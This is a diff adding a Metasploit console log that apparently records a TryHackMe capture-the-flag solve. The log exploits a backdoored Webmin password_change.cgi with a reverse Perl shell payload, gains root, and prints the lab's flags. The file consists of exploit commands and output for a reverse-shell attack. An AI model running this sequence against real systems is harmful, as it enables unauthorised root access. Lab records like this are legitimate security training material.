@@ -1,0 +1,58 @@
+[1m[34m[*][0m Spooling to file root_log.log...
+[4mmsf5[0m [0m> search webmin
+[0m
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  auxiliary/admin/[45mwebmin[0m/edit_html_fileaccess  2012-09-06       normal     No     [45mWebmin[0m edit_html.cgi file Parameter Traversal Arbitrary File Access
+   1  auxiliary/admin/[45mwebmin[0m/file_disclosure       2006-06-30       normal     No     [45mWebmin[0m File Disclosure
+   2  exploit/linux/http/[45mwebmin[0m_backdoor           2019-08-10       [32mexcellent[0m  Yes    [45mWebmin[0m password_change.cgi Backdoor
+   3  exploit/linux/http/[45mwebmin[0m_packageup_rce      2019-05-16       [32mexcellent[0m  Yes    [45mWebmin[0m Package Updates Remote Command Execution
+   4  exploit/unix/webapp/[45mwebmin[0m_show_cgi_exec     2012-09-06       [32mexcellent[0m  Yes    [45mWebmin[0m /file/show.cgi Remote Command Execution
+   5  exploit/unix/webapp/[45mwebmin[0m_upload_exec       2019-01-17       [32mexcellent[0m  Yes    [45mWebmin[0m Upload Authenticated RCE
+
+
+Interact with a module by name or index, for example [32muse 5[0m or [32muse exploit/unix/webapp/webmin_upload_exec[0m
+
+[4mmsf5[0m [0m> user[K exploit/linux/http/webmin_backdoor
+[0m[1m[34m[*][0m Using configured payload cmd/unix/reverse_perl
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> set RHOSTS 10.10.170.30
+[0mRHOSTS => 10.10.170.30
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> set LHOST 10.8.21.42
+[0mLHOST => 10.8.21.42
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> set SSL truwe[K[Ke
+[0m[1m[33m[!][0m Changing the SSL option's value may require changing RPORT!
+SSL => true
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.8.21.42:4444 
+[1m[34m[*][0m Configuring Automatic (Unix In-Memory) target
+[1m[34m[*][0m Sending cmd/unix/reverse_perl command payload
+[1m[34m[*][0m Command shell session 1 opened (10.8.21.42:4444 -> 10.10.170.30:32984) at 2020-07-17 22:03:01 -0600
+
+[0muid=0(root) gid=0(root) groups=0(root)
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
+    link/ether 02:dc:d2:42:4c:e6 brd ff:ff:ff:ff:ff:ff
+    inet 10.10.170.30/16 brd 10.10.255.255 scope global dynamic eth0
+       valid_lft 2866sec preferred_lft 2866sec
+    inet6 fe80::dc:d2ff:fe42:4ce6/64 scope link 
+       valid_lft forever preferred_lft forever
+dark
+user.txt
+webmin_1.890_all.deb
+THM{SUPPLY_CHAIN_COMPROMISE}
+root.txt
+THM{UPDATE_YOUR_INSTALL}
+
+Abort session 1? [y/N]  
+[1m[34m[*][0m 10.10.170.30 - Command shell session 1 closed.  Reason: User exit
+[4mmsf5[0m exploit([1m[31mlinux/http/webmin_backdoor[0m) [0m> exit
+[0m
